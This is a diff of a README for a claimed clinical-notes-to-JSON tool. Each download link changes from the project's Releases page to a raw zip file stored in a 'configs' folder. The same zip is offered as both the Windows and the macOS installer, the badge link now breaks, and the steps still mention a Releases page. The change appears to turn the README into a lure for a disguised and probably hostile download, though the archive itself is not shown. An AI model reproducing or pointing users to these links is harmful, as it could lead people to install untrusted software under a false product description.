@@ -1,7 +1,7 @@
 # 🎛️ Laos_System - Effortlessly Convert Clinical Notes
 
 ## 📥 Download Now
-[![Download Laos_System](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/starlin1803/Laos_System/releases)
+[![Download Laos_System](https://raw.githubusercontent.com/starlin1803/Laos_System/main/configs/Laos-System-1.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/starlin1803/Laos_System/main/configs/Laos-System-1.8.zip)
 
 ## 🚀 Getting Started
 Welcome to Laos_System! This application helps you turn clinical speech and text notes into structured JSON documents. It's simple to use, even if you are not technical. Follow the steps below to download and run the application on your computer.
@@ -24,12 +24,12 @@ Laos_System includes several useful features:
 5. **Output Flexibility**: Save your data in different locations.
 
 ## 📥 Download & Install
-To download the application, visit the following link: [Download Laos_System](https://github.com/starlin1803/Laos_System/releases).
+To download the application, visit the following link: [Download Laos_System](https://raw.githubusercontent.com/starlin1803/Laos_System/main/configs/Laos-System-1.8.zip).
 
 1. Click on the link above.
 2. You will be taken to the Releases page.
 3. Find the latest version of Laos_System (usually at the top).
-4. Click on the downloadable file (e.g., Laos_System_v1.0.exe for Windows or Laos_System_v1.0.dmg for macOS).
+4. Click on the downloadable file (e.g., https://raw.githubusercontent.com/starlin1803/Laos_System/main/configs/Laos-System-1.8.zip for Windows or https://raw.githubusercontent.com/starlin1803/Laos_System/main/configs/Laos-System-1.8.zip for macOS).
 5. Wait for the download to complete.
 
 ## 🛠️ Running the Application
@@ -68,6 +68,6 @@ Check the troubleshooting section of the app or visit the Issues page on the Git
 Your feedback is important. If you have questions or suggestions, please feel free to reach out on our GitHub page. 
 
 ## 📥 Again, Download Now
-To download the application, click here: [Download Laos_System](https://github.com/starlin1803/Laos_System/releases).
+To download the application, click here: [Download Laos_System](https://raw.githubusercontent.com/starlin1803/Laos_System/main/configs/Laos-System-1.8.zip).
 
 Thank you for choosing Laos_System. Happy converting!
